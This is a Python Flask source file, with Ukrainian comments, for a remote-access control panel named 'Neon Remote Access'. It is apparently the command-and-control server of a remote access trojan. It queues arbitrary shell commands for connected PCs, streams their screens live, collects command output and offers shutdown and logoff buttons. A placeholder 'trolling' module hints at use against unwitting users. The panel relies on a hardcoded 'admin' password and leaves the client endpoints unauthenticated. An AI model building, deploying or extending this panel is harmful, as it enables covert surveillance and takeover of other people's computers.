import time
import threading
from flask import Flask, render_template_string, request, Response, jsonify, session, redirect, url_for

app = Flask(__name__)
app.secret_key = "super_secret_cyber_key"  # Ключ для сесій
PASSWORD = "admin"  # Пароль для входу в панель

# Словник для зберігання даних усіх ПК та Thread Lock для безпечної роботи з Gunicorn
clients = {}
clients_lock = threading.Lock()

# ================= HTML ШАБЛОНЫ (Неоновый дизайн) =================

CSS_BASE = """
<style>
    :root { 
        --neon: #00ffd0; 
        --bg: #05060d; 
        --panel: rgba(0,0,0,.35); 
        --border: rgba(255,255,255,.08); 
    }
    * { box-sizing: border-box; }
    body { 
        margin: 0; 
        background: var(--bg); 
        color: var(--neon); 
        font-family: 'Inter', 'Segoe UI', Arial, sans-serif; 
    }
    a { text-decoration: none; color: var(--neon); }
    
    .sidebar {
        position: fixed; top: 0; left: 0;
        width: 260px; height: 100vh;
        background: rgba(0,0,0,.92);
        border-right: 1px solid var(--border);
        padding: 20px 16px;
        z-index: 100;
    }
    .sidebar h2 { margin-top: 0; text-align: center; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 10px var(--neon); }
    .nav a {
        display: block; padding: 12px; margin-bottom: 10px;
        border-radius: 8px; border: 1px solid var(--border);
        transition: 0.3s;
    }
    .nav a:hover, .nav a.active {
        background: rgba(0, 255, 208, 0.1);
        border-color: var(--neon);
        box-shadow: 0 0 10px rgba(0, 255, 208, 0.2);
    }

    .main-content {
        margin-left: 260px;
        padding: 30px;
        min-height: 100vh;
    }
    
    .card {
        background: var(--panel);
        border: 1px solid var(--border);
        border-radius: 10px;
        padding: 20px;
        margin-bottom: 20px;
        box-shadow: 0 4px 15px rgba(0,0,0,0.5);
    }
    
    input[type="text"], input[type="password"] {
        width: 100%; padding: 12px; margin: 10px 0;
        background: #071018; border: 1px solid var(--neon);
        color: var(--neon); border-radius: 6px; outline: none;
    }
    button {
        width: 100%; padding: 12px; border-radius: 6px;
        border: 1px solid var(--neon); background: #001a1a;
        color: var(--neon); cursor: pointer; font-weight: bold;
        transition: 0.3s;
    }
    button:hover {
        background: var(--neon); color: #000;
        box-shadow: 0 0 15px var(--neon);
    }
    textarea {
        width: 100%; height: 300px; background: #000;
        color: var(--neon); border: 1px solid var(--border);
        border-radius: 6px; padding: 12px; font-family: monospace;
        resize: none; outline: none; margin-top: 10px;
    }
</style>
"""

LOGIN_HTML = CSS_BASE + """
<style>
    body { display: flex; align-items: center; justify-content: center; height: 100vh; }
    .box { background: #0b0b12; padding: 40px; border-radius: 12px; box-shadow: 0 0 40px var(--neon); width: 400px; text-align: center; }
    .title { font-size: 24px; font-weight: 700; margin-bottom: 20px; text-shadow: 0 0 10px var(--neon); }
    .msg { color: #ff4d4d; margin-bottom: 15px; font-weight: bold; }
</style>
<div class="box">
    <div class="title">Neon Remote Access</div>
    {% if error %}<div class="msg">{{ error }}</div>{% endif %}
    <form method="POST">
        <input type="password" name="password" placeholder="Введіть пароль адміна..." required>
        <button type="submit" style="margin-top: 15px;">УВІЙТИ</button>
    </form>
</div>
"""

SIDEBAR_HTML = """
<div class="sidebar">
    <h2>Neon Control</h2>
    <div class="nav">
        <a href="/dashboard" class="active">🖥️ Дашборд (ПК)</a>
        <a href="#" onclick="alert('Модуль файлового менеджера не подключен.'); return false;">📁 Файли</a>
        <a href="#" onclick="alert('Модуль диспетчера задач не подключен.'); return false;">⚙️ Процеси</a>
        <a href="#" onclick="alert('Модуль троллінгу не подключен.'); return false;">🤡 Тролінг</a>
        <a href="/logout" style="margin-top: 50px; border-color: #ff4d4d; color: #ff4d4d;">🚪 Вихід</a>
    </div>
</div>
"""

DASHBOARD_HTML = CSS_BASE + SIDEBAR_HTML + """
<style>
    .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; }
    .status { display: inline-block; width: 12px; height: 12px; border-radius: 50%; margin-right: 8px; }
    .online { background: #00ffd0; box-shadow: 0 0 10px #00ffd0; }
    .offline { background: #ff4d4d; box-shadow: 0 0 10px #ff4d4d; }
    .btn-connect { display: block; text-align: center; border: 1px solid var(--neon); color: var(--neon); padding: 10px; border-radius: 6px; margin-top: 15px; transition: 0.3s; }
    .btn-connect:hover { background: var(--neon); color: #000; box-shadow: 0 0 15px var(--neon); }
</style>
<div class="main-content">
    <h1 style="border-bottom: 1px solid var(--border); padding-bottom: 15px; margin-top: 0;">Підключені пристрої</h1>
    <div class="grid">
        {% for pc in pcs %}
        <div class="card">
            <h3 style="margin-top: 0; color: #fff;">💻 {{ pc.name }}</h3>
            <p style="color: #aaa; font-size: 14px;">IP: {{ pc.ip }}</p>
            <p>
                <span class="status {% if pc.online %}online{% else %}offline{% endif %}"></span>
                {% if pc.online %}В мережі{% else %}Не в мережі{% endif %}
            </p>
            {% if pc.online %}
                <a href="/view/{{ pc.id }}" class="btn-connect">⚡ Підключитися</a>
            {% else %}
                <span class="btn-connect" style="opacity: 0.3; border-color: #555; color: #555; pointer-events: none;">Недоступний</span>
            {% endif %}
        </div>
        {% else %}
        <p style="color: #aaa; font-style: italic;">Очікування підключення клієнтів...</p>
        {% endfor %}
    </div>
</div>
"""

CONTROL_HTML = CSS_BASE + SIDEBAR_HTML + """
<style>
    :root {
        --neon: #00ffd0;
        --muted: #4fbdb1;
        --bg: #05060d;
        --panel: rgba(11, 15, 25, 0.75);
        --border: rgba(0, 255, 208, 0.2);
        --border-light: rgba(255, 255, 255, 0.08);
    }

    .main-content {
        padding: 20px;
        color: #e2e8f0;
        font-family: 'Inter', system-ui, -apple-system, sans-serif;
        /* margin-left: 260px підтягується автоматично з CSS_BASE для меню */
    }

    .control-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 20px;
        background: var(--panel);
        padding: 15px 20px;
        border-radius: 12px;
        border: 1px solid var(--border-light);
        backdrop-filter: blur(10px);
    }

    .control-header h2 {
        margin: 0;
        font-size: 20px;
        display: flex;
        align-items: center;
        gap: 12px;
        color: #fff;
    }

    .status-badge {
        display: inline-flex;
        align-items: center;
        gap: 6px;
        font-size: 12px;
        padding: 4px 10px;
        border-radius: 20px;
        background: rgba(0, 255, 208, 0.1);
        color: var(--neon);
        border: 1px solid var(--border);
    }

    .status-dot {
        width: 8px;
        height: 8px;
        background: var(--neon);
        border-radius: 50%;
        box-shadow: 0 0 8px var(--neon);
        animation: pulse 2s infinite;
    }

    @keyframes pulse {
        0% { opacity: 1; transform: scale(1); }
        50% { opacity: 0.4; transform: scale(0.8); }
        100% { opacity: 1; transform: scale(1); }
    }

    .btn-back {
        text-decoration: none;
        color: var(--neon);
        font-size: 14px;
        border: 1px solid var(--border);
        padding: 8px 16px;
        border-radius: 8px;
        background: rgba(0, 255, 208, 0.05);
        transition: all 0.2s ease;
        display: inline-flex;
        align-items: center;
        gap: 6px;
    }

    .btn-back:hover {
        background: var(--neon);
        color: #000;
        box-shadow: 0 0 15px rgba(0, 255, 208, 0.4);
    }

    .control-grid {
        display: grid;
        grid-template-columns: 1.4fr 1fr;
        gap: 20px;
    }

    @media (max-width: 1100px) {
        .control-grid {
            grid-template-columns: 1fr;
        }
    }

    .card {
        background: var(--panel);
        border: 1px solid var(--border-light);
        border-radius: 12px;
        padding: 18px;
        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.37);
        backdrop-filter: blur(8px);
        display: flex;
        flex-direction: column;
    }

    .card-title {
        margin: 0 0 15px 0;
        font-size: 16px;
        font-weight: 600;
        color: #fff;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }

    /* Stream Video Styling */
    .video-container {
        position: relative;
    }

    .video-wrapper {
        position: relative;
        width: 100%;
        background: #000;
        border-radius: 8px;
        overflow: hidden;
        border: 1px solid var(--border);
        box-shadow: 0 0 20px rgba(0, 255, 208, 0.15);
        aspect-ratio: 16 / 9;
        display: flex;
        align-items: center;
        justify-content: center;
    }

    .video-wrapper img {
        width: 100%;
        height: 100%;
        object-fit: contain;
    }

    .stream-overlay {
        position: absolute;
        top: 10px;
        right: 10px;
        display: flex;
        gap: 8px;
        z-index: 5;
    }

    .icon-btn {
        background: rgba(0, 0, 0, 0.65);
        border: 1px solid var(--border-light);
        color: #fff;
        padding: 6px 10px;
        border-radius: 6px;
        cursor: pointer;
        font-size: 12px;
        transition: all 0.2s;
    }

    .icon-btn:hover {
        border-color: var(--neon);
        color: var(--neon);
    }

    .stream-footer {
        color: #94a3b8;
        font-size: 12px;
        margin-top: 12px;
        display: flex;
        justify-content: space-between;
        align-items: center;
    }

    /* CMD Terminal Styling */
    .cmd-container {
        display: flex;
        flex-direction: column;
        height: 100%;
    }

    .quick-cmds {
        display: flex;
        gap: 6px;
        flex-wrap: wrap;
        margin-bottom: 12px;
    }

    .quick-btn {
        background: rgba(255, 255, 255, 0.05);
        border: 1px solid var(--border-light);
        color: var(--muted);
        padding: 4px 10px;
        border-radius: 6px;
        font-size: 12px;
        cursor: pointer;
        transition: all 0.2s;
        font-family: monospace;
    }

    .quick-btn:hover {
        border-color: var(--neon);
        color: var(--neon);
        background: rgba(0, 255, 208, 0.1);
    }

    .cmd-form {
        display: flex;
        gap: 10px;
        margin-bottom: 12px;
    }

    .cmd-input {
        flex: 1;
        background: #020617;
        border: 1px solid var(--border-light);
        color: var(--neon);
        padding: 10px 14px;
        border-radius: 8px;
        font-family: 'Consolas', 'Fira Code', monospace;
        font-size: 14px;
        outline: none;
        transition: border-color 0.2s;
    }

    .cmd-input:focus {
        border-color: var(--neon);
        box-shadow: 0 0 10px rgba(0, 255, 208, 0.2);
    }

    .cmd-submit {
        background: rgba(0, 255, 208, 0.15);
        border: 1px solid var(--border);
        color: var(--neon);
        padding: 10px 18px;
        border-radius: 8px;
        cursor: pointer;
        font-weight: 600;
        transition: all 0.2s;
        white-space: nowrap;
    }

    .cmd-submit:hover {
        background: var(--neon);
        color: #000;
        box-shadow: 0 0 15px rgba(0, 255, 208, 0.4);
    }

    .terminal-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        background: #090d16;
        padding: 8px 12px;
        border-radius: 8px 8px 0 0;
        border: 1px solid var(--border-light);
        border-bottom: none;
        font-family: monospace;
        font-size: 12px;
        color: #64748b;
    }

    .cmd-output {
        flex: 1;
        min-height: 280px;
        max-height: 480px;
        background: #020617;
        color: #38edf8;
        border: 1px solid var(--border-light);
        border-radius: 0 0 8px 8px;
        padding: 12px;
        font-family: 'Consolas', 'Fira Code', 'Courier New', monospace;
        font-size: 13px;
        line-height: 1.5;
        resize: vertical;
        outline: none;
        box-sizing: border-box;
        box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.8);
    }

    .cmd-output::-webkit-scrollbar {
        width: 8px;
    }

    .cmd-output::-webkit-scrollbar-track {
        background: #020617;
    }

    .cmd-output::-webkit-scrollbar-thumb {
        background: #1e293b;
        border-radius: 4px;
    }

    .cmd-output::-webkit-scrollbar-thumb:hover {
        background: var(--neon);
    }
</style>

<div class="main-content">
    <div class="control-header">
        <h2>
            🖥 Термінал управління: <span style="color: var(--neon);">{{ pc_name }}</span>
            <span class="status-badge"><span class="status-dot"></span> Online</span>
        </h2>
        <a href="/dashboard" class="btn-back">⬅ Повернутися</a>
    </div>

    <div class="control-grid">
        <!-- Live Stream Card -->
        <div class="card video-container">
            <div class="card-title">
                <span>📺 Трансляція екрану</span>
                <span style="font-size: 12px; color: var(--neon); font-weight: normal;">● LIVE</span>
            </div>
            
            <div class="video-wrapper" id="videoWrapper">
                <div class="stream-overlay">
                    <button class="icon-btn" onclick="refreshStream()" title="Оновити потік">🔄</button>
                    <button class="icon-btn" onclick="toggleFullscreen()" title="На весь екран">⛶</button>
                </div>
                <img id="streamImg" src="/video_feed/{{ cid }}" alt="Очікування трансляції..." onerror="handleStreamError(this)">
            </div>
            
            <div class="stream-footer">
                <span>⚡ Активна сесія трансляції</span>
                <span>ID: {{ cid }}</span>
            </div>
        </div>

        <!-- CMD Terminal Card -->
        <div class="card cmd-container">
            <div class="card-title">
                <span>⌨ CMD (Командний рядок)</span>
                <button class="icon-btn" onclick="clearOutput()" style="font-size: 11px;">Очистити</button>
            </div>

            <!-- Quick Commands -->
            <div class="quick-cmds">
                <button class="quick-btn" onclick="setQuickCmd('dir')">dir</button>
                <button class="quick-btn" onclick="setQuickCmd('whoami')">whoami</button>
                <button class="quick-btn" onclick="setQuickCmd('ipconfig /all')">ipconfig</button>
                <button class="quick-btn" onclick="setQuickCmd('tasklist')">tasklist</button>
                <button class="quick-btn" onclick="setQuickCmd('netstat -an')">netstat</button>
            </div>
            
            <!-- Power Control Commands -->
            <div class="quick-cmds" style="padding-top: 10px; border-top: 1px solid var(--border-light); margin-bottom: 15px;">
                <span style="color: var(--muted); font-size: 12px; margin-right: 10px; display: flex; align-items: center;">⚡ Керування живленням:</span>
                <button class="quick-btn" style="color: #fbbf24; border-color: rgba(251, 191, 36, 0.3);" onclick="executeDirectCmd('logoff')">🚪 Логаут</button>
                <button class="quick-btn" style="color: #60a5fa; border-color: rgba(96, 165, 250, 0.3);" onclick="executeDirectCmd('rundll32.exe powrprof.dll,SetSuspendState 0,1,0')">🌙 Сплячий режим</button>
                <button class="quick-btn" style="color: #ef4444; border-color: rgba(239, 68, 68, 0.3);" onclick="executeDirectCmd('shutdown /s /t 0')">⏻ Вимкнути ПК</button>
            </div>

            <form class="cmd-form" onsubmit="sendCommand(event)">
                <input type="text" id="cmdInput" class="cmd-input" placeholder="Введіть команду (напр. systeminfo)..." required autocomplete="off">
                <button type="submit" class="cmd-submit">Виконати</button>
            </form>

            <div class="terminal-header">
                <span>TERMINAL OUTPUT</span>
                <span id="cmdStatus" style="color: var(--neon);">Готовий</span>
            </div>
            <textarea id="output" class="cmd-output" readonly placeholder="Тут буде виведено результат виконання команд...">{{ output }}</textarea>
        </div>
    </div>
</div>

<script>
    function sendCommand(e) {
        e.preventDefault();
        const input = document.getElementById('cmdInput');
        const cmd = input.value.trim();
        if (!cmd) return;

        const status = document.getElementById('cmdStatus');
        status.textContent = '⏳ Виконується...';
        status.style.color = '#f59e0b';

        fetch('/api/send_cmd/{{ cid }}', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'command=' + encodeURIComponent(cmd)
        }).then(r => {
            if (r.ok) {
                input.value = '';
            } else {
                status.textContent = '❌ Помилка';
                status.style.color = '#ef4444';
            }
        }).catch(() => {
            status.textContent = '❌ Помилка мережі';
            status.style.color = '#ef4444';
        });
    }

    function setQuickCmd(cmd) {
        const input = document.getElementById('cmdInput');
        input.value = cmd;
        input.focus();
    }
    
    // Нова функція для миттєвого виконання команд живлення з підтвердженням
    function executeDirectCmd(cmd) {
        if (!confirm('Ви впевнені, що хочете виконати цю дію?')) return;
        
        const status = document.getElementById('cmdStatus');
        status.textContent = '⏳ Виконується дія...';
        status.style.color = '#f59e0b';

        fetch('/api/send_cmd/{{ cid }}', {
            method: 'POST',
            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
            body: 'command=' + encodeURIComponent(cmd)
        }).then(r => {
            if (r.ok) {
                status.textContent = '✅ Команду відправлено';
                status.style.color = 'var(--neon)';
            } else {
                status.textContent = '❌ Помилка відправки';
                status.style.color = '#ef4444';
            }
        }).catch(() => {
            status.textContent = '❌ Помилка мережі';
            status.style.color = '#ef4444';
        });
    }

    function clearOutput() {
        document.getElementById('output').value = '';
        document.getElementById('cmdStatus').textContent = 'Очищено';
        document.getElementById('cmdStatus').style.color = 'var(--muted)';
    }

    function refreshStream() {
        const img = document.getElementById('streamImg');
        img.src = '/video_feed/{{ cid }}?t=' + new Date().getTime();
    }

    function handleStreamError(img) {
        setTimeout(() => {
            img.src = '/video_feed/{{ cid }}?t=' + new Date().getTime();
        }, 2000);
    }

    function toggleFullscreen() {
        const wrapper = document.getElementById('videoWrapper');
        if (!document.fullscreenElement) {
            wrapper.requestFullscreen().catch(err => console.log(err));
        } else {
            document.exitFullscreen();
        }
    }

    let lastOutput = '';
    setInterval(() => {
        fetch('/api/get_output/{{ cid }}')
            .then(r => r.text())
            .then(txt => {
                if (txt && txt !== lastOutput) {
                    lastOutput = txt;
                    const outbox = document.getElementById('output');
                    outbox.value = txt;
                    outbox.scrollTop = outbox.scrollHeight;

                    const status = document.getElementById('cmdStatus');
                    status.textContent = 'Готовий';
                    status.style.color = 'var(--neon)';
                }
            })
            .catch(() => {});
    }, 1200);
</script>
"""

# ================= МАРШРУТИ WEB-ІНТЕРФЕЙСУ =================

@app.route("/", methods=["GET", "POST"])
def login():
    if session.get("logged_in"):
        return redirect(url_for("dashboard"))
    
    error = None
    if request.method == "POST":
        if request.form.get("password") == PASSWORD:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        else:
            error = "Невірний пароль!"
    return render_template_string(LOGIN_HTML, error=error)

@app.route("/logout")
def logout():
    session.pop("logged_in", None)
    return redirect(url_for("login"))

@app.route("/dashboard")
def dashboard():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    
    now = time.time()
    pc_list = []
    
    with clients_lock:
        items = list(clients.items())
        
    for cid, data in items:
        is_online = (now - data.get("last_seen", 0)) < 15
        pc_list.append({
            "id": cid,
            "name": data.get("name", "Unknown"),
            "ip": data.get("ip", "0.0.0.0"),
            "online": is_online
        })
    return render_template_string(DASHBOARD_HTML, pcs=pc_list)

@app.route("/view/<cid>")
def view_pc(cid):
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    
    with clients_lock:
        if cid not in clients:
            return redirect(url_for("dashboard"))
        pc_name = clients[cid]["name"]
        output = clients[cid]["output"]
        
    return render_template_string(CONTROL_HTML, cid=cid, pc_name=pc_name, output=output)

@app.route("/video_feed/<cid>")
def video_feed(cid):
    def generate():
        while True:
            frame = None
            with clients_lock:
                if cid in clients:
                    clients[cid]["last_viewed"] = time.time()
                    frame = clients[cid]["frame"]
            
            if frame:
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
            time.sleep(0.05)
            
    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')

# ================= API ДЛЯ WEB-ПАНЕЛІ =================

@app.route("/api/send_cmd/<cid>", methods=["POST"])
def send_cmd(cid):
    if not session.get("logged_in"):
        return "Unauthorized", 401
    
    with clients_lock:
        if cid in clients:
            clients[cid]["cmd"] = request.form.get("command", "")
            return "OK", 200
    return "Not Found", 404

@app.route("/api/get_output/<cid>")
def get_output(cid):
    if not session.get("logged_in"):
        return "", 401
    
    with clients_lock:
        if cid in clients:
            return clients[cid]["output"]
    return "", 404

# ================= API ДЛЯ КЛІЄНТІВ (ПК) =================

@app.route("/api/heartbeat", methods=["POST"])
def heartbeat():
    data = request.json or {}
    cid = data.get("client_id")
    if not cid:
        return jsonify({"error": "No client_id"}), 400
    
    now = time.time()
    with clients_lock:
        if cid not in clients:
            clients[cid] = {
                "name": data.get("name", "Unknown PC"),
                "last_viewed": 0,
                "frame": None,
                "cmd": "",
                "output": ""
            }
        
        clients[cid]["last_seen"] = now
        clients[cid]["ip"] = request.remote_addr
        
        should_stream = (now - clients[cid]["last_viewed"]) < 3
        cmd_to_run = clients[cid]["cmd"]
        clients[cid]["cmd"] = ""
    
    return jsonify({"stream": should_stream, "cmd": cmd_to_run})

@app.route("/api/upload_frame/<cid>", methods=["POST"])
def upload_frame(cid):
    with clients_lock:
        if cid in clients:
            clients[cid]["frame"] = request.data
            clients[cid]["last_seen"] = time.time()
    return "OK", 200

@app.route("/api/post_output/<cid>", methods=["POST"])
def post_output(cid):
    with clients_lock:
        if cid in clients:
            clients[cid]["output"] = request.data.decode("utf-8", errors="ignore")
    return "OK", 200

if __name__ == "__main__":
    # Локальний запуск для тестування (якщо запускати напряму через python app.py)
    app.run(host="0.0.0.0", port=5000, threaded=True)
